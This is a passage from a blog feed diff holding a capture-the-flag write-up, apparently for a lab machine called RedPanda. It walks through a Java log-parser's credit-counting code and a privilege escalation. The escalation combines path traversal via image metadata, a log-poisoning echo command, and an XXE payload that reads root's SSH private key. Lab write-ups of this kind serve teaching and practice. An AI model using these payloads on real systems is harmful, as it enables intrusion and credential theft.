+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Artist: &#34;</span> <span style="color:#f92672">+</span> artist<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            String xmlPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/credits/&#34;</span> <span style="color:#f92672">+</span> artist <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_creds.xml&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            addViewTo<span style="color:#f92672">(</span>xmlPath<span style="color:#f92672">,</span> parsed_data<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uri&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>First, in the main function, the application will read a log file <em>/opt/panda_search/redpanda.log</em>, and will call the function <em>isImage()</em> on each line of it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span><span style="color:#f92672">(</span>String filename<span style="color:#f92672">){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>filename<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.jpg&#34;</span><span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>This function appears to be checking the string parameter called filename (in this case it&rsquo;s each line of the log file) to see if it contains <em>.jpg</em> substring.</p>
+<p>If <em>yes</em>, then it will call <em>parseLog()</em> function on it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span><span style="color:#f92672">(</span>String line<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> strings <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span><span style="color:#a6e22e">split</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\|\\|&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>        map<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;status_code&#34;</span><span style="color:#f92672">,</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">parseInt</span><span style="color:#f92672">(</span>strings<span style="color:#f92672">[</span>0<span style="color:#f92672">]));</span>
+</span></span><span style="display:flex;"><span>        map<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ip&#34;</span><span style="color:#f92672">,</span> strings<span style="color:#f92672">[</span>1<span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>        map<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;user_agent&#34;</span><span style="color:#f92672">,</span> strings<span style="color:#f92672">[</span>2<span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>        map<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uri&#34;</span><span style="color:#f92672">,</span> strings<span style="color:#f92672">[</span>3<span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> map<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Which will split the line using <em>pipe</em> <code>|</code> character as delimiter, and will store each part <em>from 0 to 3</em> in a hashmap.</p>
+<p>Then it will print the value of <em>uri</em> key in that hashmap, and will pass this value to <em>getArtist()</em> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span><span style="color:#f92672">(</span>String uri<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> JpegProcessingException
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String fullpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span style="color:#f92672">+</span> uri<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        File jpgFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>fullpath<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        Metadata metadata <span style="color:#f92672">=</span> JpegMetadataReader<span style="color:#f92672">.</span><span style="color:#a6e22e">readMetadata</span><span style="color:#f92672">(</span>jpgFile<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span><span style="color:#f92672">(</span>Directory dir <span style="color:#f92672">:</span> metadata<span style="color:#f92672">.</span><span style="color:#a6e22e">getDirectories</span><span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span><span style="color:#f92672">(</span>Tag tag <span style="color:#f92672">:</span> dir<span style="color:#f92672">.</span><span style="color:#a6e22e">getTags</span><span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>tag<span style="color:#f92672">.</span><span style="color:#a6e22e">getTagName</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Artist&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> tag<span style="color:#f92672">.</span><span style="color:#a6e22e">getDescription</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;N/A&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>This function reads an <em>image file</em> from <em>/opt/panda_search/src/main/resources/static</em> directory, in which its name will be the value of <em>uri</em> key stored in the hashmap, and will process it and get the value of <em>Artist</em> metadata tag.</p>
+<p>After that, it will print that name and build a new path for a <em>XML</em> file as: <em>/credits/ + [artist name that it just got] + _creds.xml</em>.</p>
+<p>Finally, it will call <em>addViewTo()</em> function that takes <em>two parameters</em>, the first is <em>XML Path</em> that it just created and the value of the <em>uri</em> key from the hashmap.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span><span style="color:#f92672">(</span>String path<span style="color:#f92672">,</span> String uri<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> JDOMException<span style="color:#f92672">,</span> IOException
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        SAXBuilder saxBuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        XMLOutputter xmlOutput <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XMLOutputter<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        xmlOutput<span style="color:#f92672">.</span><span style="color:#a6e22e">setFormat</span><span style="color:#f92672">(</span>Format<span style="color:#f92672">.</span><span style="color:#a6e22e">getPrettyFormat</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        File fd <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>path<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        Document doc <span style="color:#f92672">=</span> saxBuilder<span style="color:#f92672">.</span><span style="color:#a6e22e">build</span><span style="color:#f92672">(</span>fd<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        Element rootElement <span style="color:#f92672">=</span> doc<span style="color:#f92672">.</span><span style="color:#a6e22e">getRootElement</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span><span style="color:#f92672">(</span>Element el<span style="color:#f92672">:</span> rootElement<span style="color:#f92672">.</span><span style="color:#a6e22e">getChildren</span><span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>el<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;image&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>el<span style="color:#f92672">.</span><span style="color:#a6e22e">getChild</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uri&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>uri<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    Integer totalviews <span style="color:#f92672">=</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">parseInt</span><span style="color:#f92672">(</span>rootElement<span style="color:#f92672">.</span><span style="color:#a6e22e">getChild</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;totalviews&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">())</span> <span style="color:#f92672">+</span> 1<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                    System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Total views:&#34;</span> <span style="color:#f92672">+</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>totalviews<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>                    rootElement<span style="color:#f92672">.</span><span style="color:#a6e22e">getChild</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;totalviews&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">setText</span><span style="color:#f92672">(</span>Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>totalviews<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>                    Integer views <span style="color:#f92672">=</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">parseInt</span><span style="color:#f92672">(</span>el<span style="color:#f92672">.</span><span style="color:#a6e22e">getChild</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;views&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>                    el<span style="color:#f92672">.</span><span style="color:#a6e22e">getChild</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;views&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">setText</span><span style="color:#f92672">(</span>Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>views <span style="color:#f92672">+</span> 1<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        BufferedWriter writer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedWriter<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileWriter<span style="color:#f92672">(</span>fd<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>        xmlOutput<span style="color:#f92672">.</span><span style="color:#a6e22e">output</span><span style="color:#f92672">(</span>doc<span style="color:#f92672">,</span> writer<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>This function will parse the xml file, going over each tag from parent to child looking for the <em>image</em> tag, then it will compare its <em>uri</em> child tag value to see if it matches the <em>uri</em> paramter (the one gotten from the hashmap).</p>
+<p>If there is a match, it will <em>add 1</em> to the <em>views</em> child tag, and then update the <em>totalviews</em> tag at the end, and will write these changes to the <em>new XML</em> file in the <em>path</em> parameter (/credits/ + [artist name] + _creds.xml).</p>
+<p>This is how the xml file looks liks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>woodenk@redpanda:/credits$ cat woodenk_creds.xml 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;credits&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;author&gt;</span>woodenk<span style="color:#f92672">&lt;/author&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/greg.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/hungy.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/smooch.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/smiley.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;totalviews&gt;</span>0<span style="color:#f92672">&lt;/totalviews&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/credits&gt;</span>
+</span></span></code></pre></div><h2 id="idea-to-escalate-privileges">Idea To Escalate Privileges</h2>
+<p>The idea of the attack here is that I can change the <em>Artist</em> metadata value of the image file to be <em>../dev/shm/woodenk</em> for example, so that the <em>XML Path</em> created from <em>/credits/ + [artist name] + _creds.xml</em> will become <em>/credits/../dev/shm/woodenk_creds.xml</em> pointing to <em>/tmp/woodenk_creds.xml</em> where I have write permission to.</p>
+<p>Then, this <em>new XML</em> file will have the same content as <em>/credits/woodenk_creds.xml</em>, except for one <em>uri</em> tag that will have <em>/../../../../../../../../../../../dev/shm/greg.jpg</em> as value (pointing to the image that I made having &lsquo;Artist: ../dev/shm/woodenk&rsquo; metadata), and this is done to bypass the <em>isImage()</em> function which will return true when reading this.</p>
+<p>I also need to append a <em>XXE</em> payload after the <em>uri</em> tag directly, that will point to <em>/root/.ssh/id_rsa</em> in order to read it.</p>
+<p>Finally, I&rsquo;ll poison the log file <em>/opt/panda_search/redpanda.log</em> with a payload like <code>200||10.10.10.10||mozilla||/../../../../../../../../../../../dev/shm/greg.jpg</code> (The value /../../../../../../../../../../../dev/shm/greg.jpg here needs to be the same as the one in the XML uri tag to bypass the checking in the addViewTo() function that tries to compare these 2 values).</p>
+<ul>
+<li>Command to poison to the log:
+<pre tabindex="0"><code>echo &#39;200||10.10.10.10||Mozilla||/../../../../../../../../../../../dev/shm/greg.jpg&#39; &gt;&gt; /opt/panda_search/redpanda.log
+</code></pre></li>
+</ul>
+<p>I was able to write to the log file since I am part of <em>log</em> group that has write permission to it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/tmp$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>woodenk@redpanda:/tmp$ ls -la /opt/panda_search/redpanda.log 
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> root logs <span style="color:#ae81ff">1</span> Nov <span style="color:#ae81ff">30</span> 19:48 /opt/panda_search/redpanda.log
+</span></span></code></pre></div><p>And if I wait a little bit, I will be able to read the content of <em>/dev/shm/woodenk_creds.xml</em> and I will see the content of <em>root&rsquo;s id_rsa</em> in it, and this is due to the <em>XXE</em> payload that tricks java to unintentionally write the value of <em>/root/.ssh/id_rsa</em> in the file while parsing it.</p>
+<p>The malicious <em>XML</em> file will look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///root/.ssh/id_rsa&#34; &gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;credits&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;author&gt;</span>woodenk<span style="color:#f92672">&lt;/author&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/../../../../../../../../../../../dev/shm/greg.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;rootsshkey&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/rootsshkey&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>3<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/hungy.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/smooch.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/smiley.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;totalviews&gt;</span>3<span style="color:#f92672">&lt;/totalviews&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/credits&gt;</span>
+</span></span></code></pre></div><h3 id="getting-root-user">Getting Root User</h3>
+<p>Changing <em>Artist</em> metadata:</p>
+<p><img src="update_metadata.png" alt="Changing Artist Metadata"></p>
+<p><img src="uploading_greg.png" alt="Uploading greg Image"></p>
+<p>Writing new XML and poisoning logs:</p>
+<p><img src="writing_to_xml_and_log.png" alt="Wrting XML And Poisoning logs"></p>
+<p>Reading root&rsquo;s SSH private key:</p>
+<p><img src="readin_root_ssh_private_key.png" alt="Reading root&amp;rsquo;s SSH Private Key"></p>
+<p>Grabbing root&rsquo;s SSH and logging in:</p>
+<p><img src="copying_root_private_key.png" alt="Copying Root&amp;rsquo;s SSH Private Key"></p>
+<p><img src="loggin_in_as_root.png" alt="Logging In As Root"></p>
+]]></content>
+        </item>
+        
+        <item>
             <title>Shared Write-Up</title>
             <link>https://mostxeon.github.io/posts/shared/</link>
             <pubDate>Fri, 11 Nov 2022 21:01:23 +0200</pubDate>
